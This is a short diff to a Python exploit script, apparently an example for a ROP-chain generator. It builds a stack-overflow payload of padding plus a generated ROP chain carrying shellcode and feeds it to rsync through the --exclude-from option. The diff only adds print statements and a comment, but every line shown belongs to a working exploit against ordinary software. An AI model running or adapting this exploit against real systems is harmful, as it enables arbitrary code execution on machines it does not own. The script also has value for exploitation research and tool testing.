@@ -17,7 +17,8 @@ shellcode = ( # http://shell-storm.org/shellcode/files/shellcode-603.php
  +  "\x0f\x05"                                      # syscall
 )
 
-files = [(filename, 0)]
+print "Finding gadgets and generating rop chain"
+files = [(filename, 0)] # use address 0 for non-PIE binaries (it'll autodetect the real one)
 goal_resolver = goal.create_from_arguments(files, ["/lib/x86_64-linux-gnu/libc.so.6"], [["shellcode_hex", binascii.hexlify(shellcode)]])
 rop = ropme.rop(files, goal_resolver, logging.CRITICAL)
 
@@ -26,6 +27,7 @@ payload = ("A" * 5696) + "J"*8 + rop
 with open("/tmp/rop", "w") as f: f.write(rop)
 with open("/tmp/payload", "w") as f: f.write(payload)
 
+print "Starting rsync with the exploit payload"
 p = process(argv = [filename, '-r', '--exclude-from=/tmp/payload', '.', '/tmp/to/'], executable = filename)
 #gdb.attach(p, "set disassembly-flavor intel\nbreak *mprotect\n")
 
